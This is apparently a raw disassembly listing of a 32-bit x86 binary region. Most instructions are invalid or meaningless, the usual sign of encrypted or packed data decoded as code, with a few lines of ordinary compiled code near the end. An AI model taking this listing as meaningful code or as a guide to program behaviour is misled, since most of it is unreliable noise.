  4111f2:	lods   eax,DWORD PTR ds:[esi]
  4111f3:	shl    DWORD PTR [eax-0x31cf3294],0x9e
  4111fa:	dec    ebp
  4111fb:	fbld   TBYTE PTR [ebp+0x42]
  4111fe:	pusha  
  4111ff:	dec    edx
  411200:	jae    0x41122e
  411202:	inc    esp
  411203:	or     al,0x3
  411205:	rol    bl,0x51
  411208:	jbe    0x4111cf
  41120a:	fs jmp 0x41121f
  41120d:	stos   DWORD PTR es:[edi],eax
  41120e:	and    eax,0x5cce68e2
  411213:	inc    edi
  411214:	jecxz  0x411267
  411216:	loopne 0x411259
  411218:	mov    ebp,ebx
  41121a:	retf   
  41121b:	or     ch,cl
  41121d:	xchg   ecx,eax
  41121e:	retf   0x85b4
  411221:	mov    dl,BYTE PTR [edx]
  411223:	push   ds
  411224:	das    
  411225:	lods   al,BYTE PTR ds:[esi]
  411226:	xor    al,0x1a
  411228:	cmp    DWORD PTR [ecx],ebx
  41122a:	mov    edx,0xc463ffc8
  41122f:	sub    eax,0xfa846183
  411234:	adc    esi,ecx
  411236:	les    edi,FWORD PTR [ebx-0x6d54caf7]
  41123c:	les    ebx,FWORD PTR [eax+0x3ae613be]
  411242:	scas   eax,DWORD PTR es:[edi]
  411243:	sub    BYTE PTR [ecx],dl
  411245:	cmp    al,0xe9
  411247:	sbb    esp,ecx
  411249:	jge    0x4112a0
  41124b:	mov    esi,0xc17d74b6
  411250:	and    BYTE PTR [ebx],0xb1
  411253:	std    
  411254:	and    ebp,DWORD PTR [ebx]
  411256:	cwde   
  411257:	call   0xb1d3:0xe6047696
  41125e:	mov    ebp,0xc3400f2
  411263:	mov    ah,0x7b
  411265:	test   DWORD PTR [ecx],edx
  411267:	pusha  
  411268:	inc    ebp
  411269:	(bad)  
  41126a:	in     eax,0xf9
  41126c:	arpl   WORD PTR [ebp+eax*4-0xd],bx
  411270:	inc    ebx
  411271:	or     dl,BYTE PTR [esi+eax*1+0x4a0b2a8e]
  411278:	stos   BYTE PTR es:[edi],al
  411279:	sbb    DWORD PTR [esi+0x71],ecx
  41127c:	ins    BYTE PTR es:[edi],dx
  41127d:	sub    ch,ch
  41127f:	add    ebp,DWORD PTR [edi-0x19]
  411282:	xor    DWORD PTR [edx],0xffffffd7
  411285:	cmp    dl,0x12
  411288:	mov    al,0x1a
  41128a:	or     al,0x81
  41128c:	inc    esp
  41128d:	mov    eax,ds:0x461f61ef
  411292:	jp     0x411216
  411294:	popa   
  411295:	pop    esi
  411296:	repnz and eax,0xf7375f2f
  41129c:	push   ss
  41129d:	add    eax,0x98419efd
  4112a2:	sar    al,1
  4112a4:	inc    edx
  4112a5:	scas   eax,DWORD PTR es:[edi]
  4112a6:	enter  0xa80b,0x38
  4112aa:	mov    ds:0x679257c5,al
  4112af:	retf   0x2ab0
  4112b2:	int    0xca
  4112b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112b5:	popa   
  4112b6:	xchg   edi,eax
  4112b7:	sub    eax,0xd95497f5
  4112bc:	mov    ebx,DWORD PTR [esi+0x58]
  4112bf:	imul   esi,DWORD PTR [edi-0x7a],0xfe92923d
  4112c6:	push   eax
  4112c7:	sub    al,0xf7
  4112c9:	cmp    eax,0x2e6dc256
  4112ce:	xor    ebp,DWORD PTR [edx+0x2]
  4112d1:	or     al,0x32
  4112d3:	cs mov ah,0x28
  4112d6:	xor    esp,DWORD PTR [edi+0x3]
  4112d9:	jns    0x4112d5
  4112db:	xchg   DWORD PTR [eax+0x3b7e8f81],esp
  4112e1:	cmp    esp,esi
  4112e3:	fsubr  DWORD PTR [ebp-0x7f]
  4112e6:	dec    ecx
  4112e7:	popa   
  4112e8:	pop    eax
  4112e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112ea:	shl    cl,1
  4112ec:	or     al,0xb6
  4112ee:	and    BYTE PTR [edi-0x6c],0x6e
  4112f2:	stos   BYTE PTR es:[edi],al
  4112f3:	mov    al,ds:0xbc9e6bbc
  4112f8:	aad    0x3b
  4112fa:	lock imul edx,edi,0xffffff90
  4112fe:	xor    BYTE PTR [eax+0x5b],0xa5
  411302:	add    BYTE PTR [edi],cl
  411304:	add    esi,DWORD PTR [edx+0x11]
  411307:	nop
  411308:	mov    ds:0xe3ce49b7,al
  41130d:	jo     0x411295
  41130f:	sbb    BYTE PTR [edi-0xc],bl
  411312:	retf   
  411313:	das    
  411314:	cs hlt 
  411316:	and    dl,bh
  411318:	mov    ebx,0x77e1fee1
  41131d:	fwait
  41131e:	loope  0x411371
  411320:	mov    ebx,0xb9761976
  411325:	ret    0xdd68
  411328:	mov    ah,0x7b
  41132a:	fst    DWORD PTR [ecx+0x31318e3a]
  411330:	into   
  411331:	mov    es,WORD PTR [eax-0x6300cf83]
  411337:	mov    ah,0x8a
  411339:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41133a:	lds    ebp,FWORD PTR [esi]
  41133c:	xchg   ecx,eax
  41133d:	hlt    
  41133e:	add    eax,0xae56b12e
  411343:	inc    ebx
  411344:	(bad)  
  411345:	sbb    ch,BYTE PTR [ebx+0x6f]
  411348:	inc    ecx
  411349:	popa   
  41134a:	or     ch,BYTE PTR [eax-0x32868f0b]
  411350:	outs   dx,DWORD PTR ds:[esi]
  411351:	jecxz  0x4112fb
  411353:	pusha  
  411354:	ins    BYTE PTR es:[edi],dx
  411355:	stc    
  411356:	call   0x2f2a5f0d
  41135b:	push   esi
  41135c:	xchg   edx,eax
  41135d:	out    dx,ax
  41135f:	inc    ecx
  411360:	in     eax,dx
  411361:	xlat   BYTE PTR ds:[ebx]
  411362:	das    
  411363:	jnp    0x41130e
  411365:	sbb    eax,DWORD PTR [ebp+ecx*4+0x2f86bfd2]
  41136c:	stos   BYTE PTR es:[edi],al
  41136d:	sbb    eax,0x962c486a
  411372:	in     eax,0x8e
  411374:	(bad)  
  411375:	sar    BYTE PTR [ebx+edi*2-0x3cac2f1e],cl
  41137c:	cmp    bl,BYTE PTR [edx+ebx*4-0xb]
  411380:	jg     0x4113a0
  411382:	dec    esi
  411383:	imul   ecx,DWORD PTR [ebx-0x62c8162b],0x3e48cc30
  41138d:	ja     0x4113c8
  41138f:	fsub   QWORD PTR [ecx-0x1ce75bec]
  411395:	cwde   
  411396:	jecxz  0x411328
  411398:	in     al,dx
  411399:	outs   dx,BYTE PTR ds:[esi]
  41139a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41139b:	pusha  
  41139c:	sub    dh,BYTE PTR [esi+edx*1+0x63258aa6]
  4113a3:	leave  
  4113a4:	pop    ecx
  4113a5:	or     cl,BYTE PTR [ebp+0x1da40056]
  4113ab:	or     eax,0x321c5bf3
  4113b0:	mov    ds:0xaa739f8a,eax
  4113b5:	(bad)  [edx]
  4113b7:	pop    edx
  4113b8:	repz cmp dh,BYTE PTR [edx]
  4113bb:	aam    0x76
  4113bd:	out    dx,al
  4113be:	xor    edi,DWORD PTR [ebx-0x7e]
  4113c1:	nop
  4113c2:	mov    edi,0x52a76b8a
  4113c7:	xor    DWORD PTR [edi+eax*4+0x14],ecx
  4113cb:	add    ch,bl
  4113cd:	jns    0x411435
  4113cf:	jmp    0x3e0ec7ff
  4113d4:	push   ds
  4113d5:	pop    esi
  4113d6:	es dec edx
  4113d8:	inc    ecx
  4113d9:	mov    cl,0x9e
  4113db:	or     BYTE PTR [esi-0x21ecc778],al
  4113e1:	mov    cs,eax
  4113e3:	sbb    esi,DWORD PTR [eax-0x6a]
  4113e6:	adc    al,0xe6
  4113e8:	imul   edx,DWORD PTR [ebx],0x6d
  4113eb:	call   0x2a585371
  4113f0:	adc    BYTE PTR [ecx],dl
  4113f2:	pop    edi
  4113f3:	xlat   BYTE PTR ds:[ebx]
  4113f4:	jno    0x4113f6
  4113f6:	jge    0x41140a
  4113f8:	mov    dh,0x2b
  4113fa:	(bad)  
  4113fb:	std    
  4113fc:	jb     0x411453
  4113fe:	sub    BYTE PTR [ebx+0x3962672f],ch
  411404:	shl    esi,0x68
  411407:	sub    DWORD PTR [edi],esi
  411409:	mul    DWORD PTR [ebx]
  41140b:	aam    0x1c
  41140d:	jb     0x411485
  41140f:	xor    DWORD PTR [edi+0x8],edx
  411412:	cmp    DWORD PTR [eax+0xd],eax
  411415:	jae    0x4113e8
  411417:	hlt    
  411418:	xlat   BYTE PTR ds:[ebx]
  411419:	xor    BYTE PTR [eax],ch
  41141b:	cmp    al,0xf3
  41141d:	jno    0x41147e
  41141f:	repnz (bad) ds:0x6bcb5
  411426:	inc    ebx
  411427:	inc    ebp
  411428:	repz repnz mov cl,0xe3
  41142c:	enter  0xa271,0x1e
  411430:	popa   
  411431:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411432:	push   ss
  411433:	outs   dx,BYTE PTR ds:[esi]
  411434:	jo     0x411468
  411436:	int    0xc
  411438:	mov    BYTE PTR [eax+eiz*1-0x65e2c9b6],ch
  41143f:	stc    
  411440:	out    dx,eax
  411441:	stos   DWORD PTR es:[edi],eax
  411442:	in     eax,0x1b
  411444:	ror    DWORD PTR [ebx-0x31],cl
  411447:	cmp    esi,DWORD PTR [esi]
  411449:	adc    DWORD PTR [ebx],ebp
  41144b:	(bad)  
  41144c:	fdiv   st,st(6)
  41144e:	adc    al,al
  411450:	into   
  411451:	xchg   ecx,eax
  411452:	outs   dx,DWORD PTR ds:[esi]
  411453:	or     bh,ah
  411455:	ins    BYTE PTR es:[edi],dx
  411456:	out    0x84,eax
  411458:	push   es
  411459:	mov    ebx,0x62b56586
  41145e:	mov    al,0xd6
  411460:	inc    esp
  411461:	sti    
  411462:	pop    es
  411463:	mov    ?,edx
  411465:	mov    eax,0x2de2edcc
  41146a:	add    al,0xb4
  41146c:	loope  0x411440
  41146e:	outs   dx,DWORD PTR ds:[esi]
  41146f:	cwde   
  411470:	cmp    eax,0x906958cb
  411475:	ret    
  411476:	clc    
  411477:	xchg   esi,eax
  411478:	jbe    0x4114ba
  41147a:	adc    DWORD PTR [ecx+0x12],ebp
  41147d:	mov    al,ds:0x74dbd23f
  411482:	xchg   edi,eax
  411483:	fild   QWORD PTR [edx-0x169aba4b]
  411489:	mov    eax,0x4831e174
  41148e:	in     eax,0x7c
  411490:	jo     0x41145c
  411492:	inc    esi
  411493:	and    al,0x4f
  411495:	pop    ecx
  411496:	pop    esp
  411497:	outs   dx,DWORD PTR ds:[esi]
  411498:	push   cs
  411499:	dec    ebp
  41149a:	dec    esi
  41149b:	cmp    eax,0xd6e0f49a
  4114a0:	sbb    eax,0xbc8b870d
  4114a5:	jae    0x4114e0
  4114a7:	jg     0x411434
  4114a9:	jo     0x4114a0
  4114ab:	mov    ecx,0xc378f153
  4114b0:	std    
  4114b1:	jg     0x411473
  4114b3:	inc    edi
  4114b4:	dec    ebx
  4114b5:	add    DWORD PTR [ecx-0x12],0xffffffd2
  4114b9:	call   0xb346:0x40d736f4
  4114c0:	(bad)  
  4114c1:	outs   dx,DWORD PTR ds:[esi]
  4114c2:	and    BYTE PTR [ebp-0x7eee47cb],bh
  4114c8:	leave  
  4114c9:	jnp    0x411532
  4114cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114cc:	(bad)  
  4114cd:	repz imul bh
  4114d0:	iret   
  4114d1:	jo     0x4114bd
  4114d3:	add    DWORD PTR [edx+esi*4-0x7bf29904],ecx
  4114da:	in     al,dx
  4114db:	pusha  
  4114dc:	pop    ds
  4114dd:	dec    eax
  4114de:	mov    ds:0x8af719d2,eax
  4114e3:	sbb    dl,BYTE PTR [edx-0x293fb25f]
  4114e9:	mov    eax,edi
  4114eb:	inc    ebp
  4114ec:	lea    eax,[eax]
  4114ee:	fstp   DWORD PTR [ebx+0x15]
  4114f1:	adc    al,BYTE PTR [edx+eax*2-0x21]
  4114f5:	jnp    0x4114fd
  4114f7:	dec    ebp
  4114f8:	je     0x4114ea
  4114fa:	dec    edi
  4114fb:	pop    esi
  4114fc:	les    esi,FWORD PTR [eax+0x10]
  4114ff:	add    eax,0x8dce3915
  411504:	(bad)  
  411505:	fwait
  411506:	adc    DWORD PTR ds:0x36746820,ebx
  41150c:	pusha  
  41150d:	inc    esi
  41150e:	popf   
  41150f:	xchg   edi,eax
  411510:	cmp    esi,ebx
  411512:	in     al,dx
  411513:	xor    BYTE PTR [ebp-0x58d6f9e4],cl
  411519:	push   ebp
  41151a:	cs aas 
  41151c:	lds    esp,FWORD PTR ds:0x32386778
  411522:	xor    eax,0xe936ce54
  411527:	mov    eax,ds:0xcb98b3b5
  41152c:	jle    0x4114b2
  41152e:	(bad)  
  41152f:	cli    
  411530:	shr    BYTE PTR ds:0x55a53703,1
  411536:	xchg   ecx,eax
  411537:	mov    eax,ds:0xa3818ea1
  41153c:	test   BYTE PTR [eax+eiz*4],ch
  41153f:	fmul   st(4),st
  411541:	sbb    DWORD PTR [edi],ebp
  411543:	mov    al,ds:0xbc20f8b3
  411548:	cld    
  411549:	adc    eax,0x972eec9
  41154e:	xchg   ebx,eax
  41154f:	pop    edi
  411550:	inc    edx
  411551:	mov    BYTE PTR [edi+0x1c3eb929],al
  411557:	push   0x6b
  411559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41155a:	sbb    BYTE PTR [ebx+0x6f23a2c6],dh
  411560:	(bad)  
  411561:	jg     0x41153e
  411563:	in     al,dx
  411564:	or     BYTE PTR [edx-0x198e1570],dl
  41156a:	fidivr WORD PTR [eax]
  41156c:	jg     0x411565
  41156e:	pop    edi
  41156f:	mov    ah,ch
  411571:	dec    esp
  411572:	adc    BYTE PTR [esi+0x55],0xc3
  411576:	and    al,0xed
  411578:	rcl    DWORD PTR [bx+0x61f2],0x16
  41157e:	fst    DWORD PTR [eax]
  411580:	repnz dec ebx
  411582:	sub    BYTE PTR [esp+eax*8-0x16459cf6],bl
  411589:	jg     0x41157a
  41158b:	in     eax,0xe0
  41158d:	or     eax,0x31c1ce1b
  411592:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411593:	pop    ebx
  411594:	and    BYTE PTR [edi-0x42],ah
  411597:	push   ebp
  411598:	outs   dx,DWORD PTR ds:[esi]
  411599:	and    al,0xb5
  41159b:	ins    BYTE PTR es:[edi],dx
  41159c:	or     al,0x4c
  41159e:	jnp    0x41156c
  4115a0:	mov    dh,0xe3
  4115a2:	es or  al,0xb0
  4115a5:	data16 je 0x4115b7
  4115a8:	ins    BYTE PTR es:[edi],dx
  4115a9:	push   ss
  4115aa:	pop    ecx
  4115ab:	mov    WORD PTR [ebx],?
  4115ad:	test   DWORD PTR cs:[ecx],esp
  4115b0:	cmp    eax,0x5ad9cf7e
  4115b5:	sbb    esi,DWORD PTR [edi+0x41]
  4115b8:	sbb    edx,DWORD PTR [esi]
  4115ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115bb:	inc    ebx
  4115bc:	into   
  4115bd:	int    0xda
  4115bf:	sbb    eax,0x78f76b7e
  4115c4:	or     eax,0x2f4e9cdf
  4115c9:	pop    ss
  4115ca:	ds jbe 0x4115b0
  4115cd:	xchg   ecx,eax
  4115ce:	arpl   WORD PTR [ecx-0x3cbc2d05],dx
  4115d4:	mov    ss,WORD PTR [ebx-0x3e5b7844]
  4115da:	adc    BYTE PTR [ebx],al
  4115dc:	mov    es:0x19aa2ee4,al
  4115e2:	mov    ds:0x702d0ec,eax
  4115e7:	jmp    0x902c:0xca098a8e
  4115ee:	xor    al,0xc8
  4115f0:	sbb    BYTE PTR [esi],dl
  4115f2:	lds    ebp,FWORD PTR [edi+0x27]
  4115f5:	fcmovbe st,st(2)
  4115f7:	mov    es,WORD PTR [eax]
  4115f9:	dec    edx
  4115fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115fb:	shl    DWORD PTR [edx-0x5],cl
  4115fe:	mov    ecx,0xa9825363
  411603:	push   0x3ea4abb2
  411608:	js     0x411604
  41160a:	stc    
  41160b:	loope  0x41164c
  41160d:	push   esp
  41160e:	inc    ebx
  41160f:	mov    ebp,0xe9c10e5
  411614:	push   ecx
  411615:	cmp    eax,0xa48587cf
  41161a:	jo     0x411688
  41161c:	int3   
  41161d:	pop    edi
  41161e:	xchg   esp,eax
  41161f:	je     0x411628
  411621:	mov    eax,ecx
  411623:	mov    dh,BYTE PTR [edx-0x3e]
  411626:	push   ebx
  411627:	mov    ?,WORD PTR [ebx+ebx*4+0x45]
  41162b:	int    0x5b
  41162d:	xor    BYTE PTR [ecx+0x5fb4980f],ch
  411633:	xchg   ebx,eax
  411634:	mov    bh,0xe6
  411636:	inc    edx
  411637:	nop
  411638:	cld    
  411639:	jbe    0x41161d
  41163b:	(bad)  [edi-0x4f88d5f1]
  411641:	in     eax,dx
  411642:	bound  edx,QWORD PTR [eax+0x863e668]
  411648:	dec    edx
  411649:	add    ebp,ecx
  41164b:	xchg   bl,al
  41164d:	stc    
  41164e:	mov    cl,BYTE PTR [edx+0x9ea63ad]
  411654:	xor    dl,BYTE PTR [eax+0x30138708]
  41165a:	shl    DWORD PTR [esi-0x1c],cl
  41165d:	pop    edx
  41165e:	(bad)  
  41165f:	stc    
  411660:	shl    BYTE PTR [ebx-0x1b],cl
  411663:	adc    al,0x2e
  411665:	adc    ebp,ecx
  411667:	jne    0x41160e
  411669:	mov    esp,0xf5d9214d
  41166e:	pop    DWORD PTR [edx-0x4f]
  411671:	mov    ecx,0xa8cfd15
  411676:	push   edi
  411677:	retf   
  411678:	add    eax,0x1c8282f6
  41167d:	xlat   BYTE PTR ds:[ebx]
  41167e:	push   edi
  41167f:	cld    
  411680:	(bad)  
  411681:	and    al,0x56
  411683:	pop    eax
  411684:	loopne 0x411684
  411686:	pop    es
  411687:	xchg   esp,eax
  411688:	dec    esi
  411689:	xor    DWORD PTR [ebx],esi
  41168b:	pusha  
  41168c:	jb     0x41161b
  41168e:	mov    esi,0xa32d6e80
  411693:	inc    ebx
  411694:	jns    0x411701
  411696:	aaa    
  411697:	or     eax,0xf7132645
  41169c:	adc    BYTE PTR [esi],bh
  41169e:	mov    eax,ds:0x3c1a1e96
  4116a3:	cld    
  4116a4:	sbb    eax,0xc6eba563
  4116a9:	pop    ebp
  4116aa:	mov    eax,0xdf3b4e2d
  4116af:	push   0xffffffc1
  4116b1:	pop    es
  4116b2:	push   ebx
  4116b3:	and    bl,BYTE PTR [ecx-0x6c9beb5b]
  4116b9:	add    dl,BYTE PTR [ebx-0x7685f8c0]
  4116bf:	mov    edi,0xae0fdb34
  4116c4:	adc    eax,0xb84f6a32
  4116c9:	fdivr  DWORD PTR [esi-0x16392bbd]
  4116cf:	and    BYTE PTR [ebx-0x1a1a437b],dh
  4116d5:	sub    esp,ebp
  4116d7:	push   0xe0380184
  4116dc:	call   0x9b2:0x5f22097d
  4116e3:	pusha  
  4116e4:	bound  ebp,QWORD PTR [edx-0x2d]
  4116e7:	shl    DWORD PTR [edx+0x52],cl
  4116ea:	adc    esi,eax
  4116ec:	aad    0x50
  4116ee:	imul   ebp,ecx,0xffffffa4
  4116f1:	jnp    0x411691
  4116f3:	jno    0x4116eb
  4116f5:	dec    edx
  4116f6:	pop    ss
  4116f7:	dec    ebp
  4116f8:	js     0x41172f
  4116fa:	dec    ecx
  4116fb:	fldenv [edx+0x684bbf91]
  411701:	add    al,0x1a
  411703:	jmp    0xf9f:0xbcd8c04d
  41170a:	cmp    DWORD PTR [ebp-0x42],ebx
  41170d:	outs   dx,DWORD PTR ds:[esi]
  41170e:	cmp    eax,0xeacde968
  411713:	xchg   ebx,eax
  411714:	adc    ah,al
  411716:	add    dl,cl
  411718:	add    dh,ch
  41171a:	shl    DWORD PTR [edi+ebx*8+0x781bb98],cl
  411721:	icebp  
  411722:	mov    eax,0xc98b28b2
  411727:	cwde   
  411728:	dec    esi
  411729:	xor    al,bl
  41172b:	sbb    al,0x58
  41172d:	iret   
  41172e:	dec    esp
  41172f:	cs xchg edx,eax
  411731:	pop    ss
  411732:	es (bad) 
  411734:	int3   
  411735:	jne    0x41174c
  411737:	in     eax,dx
  411738:	cmp    ebx,DWORD PTR [ecx]
  41173a:	ret    0xc7a4
  41173d:	and    cl,ah
  41173f:	mov    edi,0xd00a11ce
  411744:	pop    eax
  411745:	addr16 mov ds:0xccdc,eax
  411749:	adc    al,0x67
  41174b:	push   eax
  41174c:	fdiv   st(7),st
  41174e:	or     BYTE PTR [esi],0x47
  411751:	jg     0x4117ad
  411753:	scas   al,BYTE PTR es:[edi]
  411754:	out    0x7e,al
  411756:	cmc    
  411757:	sbb    DWORD PTR ds:0xf73864b7,ebp
  41175d:	inc    esi
  41175e:	jns    0x411774
  411760:	pop    ss
  411761:	add    DWORD PTR [eax+0x5d],ecx
  411764:	adc    ah,BYTE PTR es:[eax+0x68]
  411768:	fnstenv ds:0xab65496a
  41176e:	ss push ds
  411770:	pop    ss
  411771:	cmp    eax,0x7cea372c
  411776:	outs   dx,DWORD PTR ds:[esi]
  411777:	repnz sti 
  411779:	les    edi,FWORD PTR gs:[edi-0x4af19cbc]
  411780:	and    ebx,ebp
  411782:	push   edx
  411783:	mov    ebx,0x125d673a
  411788:	cmc    
  411789:	(bad)  
  41178a:	pop    ecx
  41178b:	xor    al,0x6d
  41178d:	dec    edx
  41178e:	dec    edi
  41178f:	push   esi
  411790:	loop   0x411736
  411792:	push   eax
  411793:	pop    esp
  411794:	or     BYTE PTR [eax+esi*4-0x2419cb39],ch
  41179b:	and    eax,0xee2fec90
  4117a0:	ss into 
  4117a2:	mov    ecx,0x9f0a77a8
  4117a7:	mov    al,ds:0x19df36b2
  4117ac:	push   ebx
  4117ad:	popa   
  4117ae:	call   0x6f432dc1
  4117b3:	popf   
  4117b4:	mov    ds:0x75d95318,eax
  4117b9:	(bad)  
  4117ba:	jo     0x411749
  4117bc:	shl    BYTE PTR [edx-0x3b],cl
  4117bf:	fbstp  TBYTE PTR [edx]
  4117c1:	ins    BYTE PTR es:[edi],dx
  4117c2:	jecxz  0x411831
  4117c4:	xor    ecx,DWORD PTR [ebx-0x2073d553]
  4117ca:	ins    BYTE PTR es:[edi],dx
  4117cb:	mov    ds:0x24d48147,eax
  4117d0:	in     al,dx
  4117d1:	xchg   edx,eax
  4117d2:	lods   al,BYTE PTR ds:[esi]
  4117d3:	add    DWORD PTR [edi+0x4a],edx
  4117d6:	int    0xf0
  4117d8:	ja     0x4117e9
  4117da:	inc    esp
  4117db:	fucomip st,st(2)
  4117dd:	fnsave [edx-0x27ce46ed]
  4117e3:	fiadd  DWORD PTR [ecx]
  4117e5:	lahf   
  4117e6:	mov    ebp,0x422732be
  4117eb:	aam    0x75
  4117ed:	mov    esi,0xd6fa3bcf
  4117f2:	(bad)  
  4117f3:	lock pop ebp
  4117f5:	shl    ecx,0xf7
  4117f8:	popa   
  4117f9:	lds    esp,FWORD PTR [ebp+0x1c]
  4117fc:	es inc edi
  4117fe:	sbb    eax,0x9faf2085
  411803:	dec    esi
  411804:	pop    ds
  411805:	cmp    BYTE PTR ds:0xc929cee8,bh
  41180b:	sbb    DWORD PTR [edx-0x4ec51701],ebp
  411811:	imul   eax,DWORD PTR [ecx-0x53],0x46
  411815:	in     eax,dx
  411816:	fbstp  TBYTE PTR [eax+0x510533e8]
  41181c:	out    0xe,al
  41181e:	add    cl,BYTE PTR [ebx+ebp*4+0x26]
  411822:	push   es
  411823:	jno    0x41182d
  411825:	or     al,0xe0
  411827:	xor    BYTE PTR ds:0xa91a9f50,dl
  41182d:	jno    0x4117fc
  41182f:	stc    
  411830:	xchg   ecx,eax
  411831:	(bad)  
  411832:	cmp    eax,0x84666f6a
  411837:	test   DWORD PTR ds:0x83db9e6c,0x8a38939a
  411841:	icebp  
  411842:	cmp    BYTE PTR [eax+0x33],ah
  411845:	shl    BYTE PTR [eax-0x783dfc77],0x9
  41184c:	sub    al,BYTE PTR [eax]
  41184e:	jg     0x4117db
  411850:	xor    edx,DWORD PTR [ebx+0x5f9962b0]
  411856:	icebp  
  411857:	inc    ebx
  411858:	jge    0x41180e
  41185a:	sub    ebp,DWORD PTR [ebp-0x6c5cdebf]
  411860:	sub    al,0x53
  411862:	pusha  
  411863:	ss data16 in al,0x7d
  411867:	jl     0x411851
  411869:	data16 out dx,al
  41186b:	test   al,0x7d
  41186d:	push   cs
  41186e:	xchg   esp,eax
  41186f:	fstp   TBYTE PTR [ebx+0x16]
  411872:	aaa    
  411873:	test   al,0x83
  411876:	loop   0x411849
  411878:	test   eax,0x797b2abf
  41187d:	xchg   cl,cl
  41187f:	xchg   esi,eax
  411880:	fmul   DWORD PTR [esi]
  411882:	sub    al,0x3b
  411884:	and    DWORD PTR [ebx],eax
  411886:	xlat   BYTE PTR ds:[ebx]
  411887:	imul   eax,DWORD PTR [edi+eiz*2],0xa5a30785
  41188e:	lods   eax,DWORD PTR ds:[esi]
  41188f:	sub    DWORD PTR ds:0xf4935227,esp
  411895:	and    eax,0xfeefc7a1
  41189a:	sub    BYTE PTR [ecx+edx*4-0x19fb7a72],0x9b
  4118a2:	or     DWORD PTR [edx+eiz*1+0x5f39329a],0xf447cedf
  4118ad:	int    0xb9
  4118af:	loope  0x4118cb
  4118b1:	cmp    al,0x2b
  4118b3:	mov    esi,0xdde8fbd1
  4118b8:	add    edx,ebx
  4118ba:	mov    esp,0xe0607161
  4118bf:	xchg   ah,cl
  4118c1:	jae    0x411918
  4118c3:	push   ebp
  4118c4:	lods   al,BYTE PTR ds:[esi]
  4118c5:	iret   
  4118c6:	(bad)  
  4118c7:	sahf   
  4118c8:	adc    al,0x6
  4118ca:	jmp    0x41189b
  4118cc:	jg     0x411883
  4118ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118cf:	push   ds
  4118d0:	push   edi
  4118d1:	or     cl,dh
  4118d3:	inc    edi
  4118d4:	cmp    BYTE PTR [ebp+0x46db85da],cl
  4118da:	popf   
  4118db:	frstor ds:0xbe7c2e27
  4118e1:	push   ebx
  4118e2:	stos   DWORD PTR es:[edi],eax
  4118e3:	push   eax
  4118e4:	div    DWORD PTR [edi]
  4118e6:	sub    DWORD PTR [ebx-0x41],esi
  4118e9:	in     al,dx
  4118ea:	repz sbb esi,DWORD PTR [edi-0x61d0976d]
  4118f1:	adc    eax,0xf305ecb7
  4118f6:	mov    dl,BYTE PTR [esi-0x8f7315a]
  4118fc:	inc    esi
  4118fd:	lods   eax,DWORD PTR ds:[esi]
  4118fe:	mov    dh,0x2b
  411900:	push   ebp
  411901:	and    eax,0xe5da058e
  411906:	lahf   
  411907:	add    al,0x40
  411909:	stos   BYTE PTR es:[edi],al
  41190a:	jae    0x411978
  41190c:	ins    DWORD PTR es:[edi],dx
  41190d:	scas   eax,DWORD PTR es:[edi]
  41190e:	jmp    0x41198e
  411910:	xchg   edx,eax
  411911:	imul   ebx,DWORD PTR [ebx-0x4955f78e],0xb
  411918:	xchg   esi,eax
  411919:	xor    al,0xbf
  41191b:	js     0x411941
  41191d:	mov    edx,DWORD PTR [edi-0x6b809922]
  411923:	xchg   DWORD PTR [edi+0x3c],ebp
  411926:	jae    0x4118d4
  411928:	mov    dl,BYTE PTR [edi-0x300a946f]
  41192e:	jo     0x411981
  411930:	loope  0x41196e
  411932:	pusha  
  411933:	mov    esi,0xe6185c2b
  411938:	idiv   BYTE PTR [esp+ecx*4-0x79]
  41193c:	jno    0x41190e
  41193e:	xor    eax,0x1b116353
  411943:	or     edi,DWORD PTR [edx-0x35060d1a]
  411949:	pop    edi
  41194a:	stc    
  41194b:	shl    DWORD PTR [eax],0x85
  41194e:	stos   DWORD PTR es:[edi],eax
  41194f:	fisubr WORD PTR [eax+0x472fe74a]
  411955:	pop    edi
  411956:	mov    ?,WORD PTR [edi+0x458d0045]
  41195c:	clc    
  41195d:	push   eax
  41195e:	push   DWORD PTR [ebp-0x28]
  411961:	push   DWORD PTR [ebp+0xc]
  411964:	call   0x413f1f
  411969:	mov    eax,DWORD PTR [ebp-0x4]
  41196c:	mov    ecx,DWORD PTR [ebp-0x8]
  41196f:	xor    eax,esi
  411971:	add    eax,edi
  411973:	cmp    ecx,eax
  411975:	je     0x413d0c
  41197b:	mov    eax,DWORD PTR [ebp-0x34]
  41197e:	movzx  eax,WORD PTR [eax+ebx*2]
  411982:	jmp    0x413cfe
  411987:	mov    esp,0x8265841a
  41198c:	loope  0x41192c
  41198e:	add    BYTE PTR [eax+0x74],0x97
  411992:	es push ds
  411994:	lock mov WORD PTR [ecx+0x10],gs
  411998:	mov    eax,DWORD PTR [ebx-0x7ca1dd7d]
  41199e:	sbb    ebp,0xd
  4119a1:	push   0x13084790
  4119a6:	fwait
  4119a7:	fwait
  4119a8:	sbb    al,0x20
  4119aa:	and    edi,ecx
  4119ac:	xor    DWORD PTR ds:0x21d323af,edx
  4119b2:	or     ebp,DWORD PTR [ebx]
  4119b4:	mov    fs,WORD PTR ds:0x93b0416e
  4119ba:	mov    esi,0xb18fe0b6
  4119bf:	sbb    dl,BYTE PTR fs:[ecx-0x48]
  4119c3:	stc    
  4119c4:	test   DWORD PTR [edi+0x20],ebp
  4119c7:	packsswb mm3,QWORD PTR [eax-0x37c02819]
  4119ce:	aam    0x74
  4119d0:	or     bl,dh
  4119d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119d3:	mov    bh,0xad
  4119d5:	dec    esi
  4119d6:	inc    esi
  4119d7:	adc    eax,0xf23b68bb
  4119dc:	and    al,0x43
  4119de:	imul   ebx,DWORD PTR [eax+0x15221bf],0xdf30694
  4119e8:	sbb    ebx,esp
  4119ea:	jno    0x411982
  4119ec:	imul   edi,DWORD PTR [ebx],0x9
  4119ef:	shl    DWORD PTR [eax],0x3f
